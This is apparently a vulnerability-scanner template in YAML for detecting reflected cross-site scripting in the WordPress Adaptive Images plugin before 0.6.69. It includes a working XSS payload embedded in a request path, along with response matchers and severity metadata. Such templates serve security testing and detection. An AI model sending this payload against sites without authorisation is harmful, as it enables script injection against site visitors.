http:
- matchers:
  - condition: and
    type: word
    words:
    - <img/src/onerror=alert(document.domain)>
    - <td>Image</td>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true'
id: wp-adaptive-xss
info:
  author: dhiyaneshDK
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  description: WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting
    because the plugin does not sanitize and escape the REQUEST_URI before outputting
    it back in a page.
  metadata:
    max-request: 1
  name: WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/eef137af-408c-481c-8493-afe6ee2105d0
  - https://plugins.trac.wordpress.org/changeset/2655683
  severity: high
  tags: wpscan,wordpress,xss,wp-plugin,wp,vuln
